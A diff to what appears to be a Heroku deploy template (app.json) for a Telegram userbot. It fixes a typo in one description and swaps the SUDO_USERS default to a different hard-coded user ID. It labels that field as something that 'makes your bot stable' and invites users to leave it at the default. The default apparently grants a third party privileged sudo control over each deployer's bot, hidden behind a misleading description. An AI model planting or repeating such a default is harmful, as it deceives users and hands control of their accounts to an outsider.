@@ -45,7 +45,7 @@
        "value": ""
     },
     "GITHUB_ACCESS_TOKEN": {
-      "description": "Your Github Access Token for gitcommit plugin.Google 'Github access token' to find.",
+      "description": "Your Github Access Token for gitcommit plugin. Google 'Github access token' to find.",
       "value": "",
       "required": false
     },
@@ -71,8 +71,8 @@
       "required": false
     },
     "SUDO_USERS": {
-      "description": "Makes your acc and bot stable",
-      "value": "1037944593",
+      "description": "Makes your bot stable. You also enter your User ID or leave it to default.",
+      "value": "844642495",
       "required": false
     },
     "HEROKU_APP_NAME": {
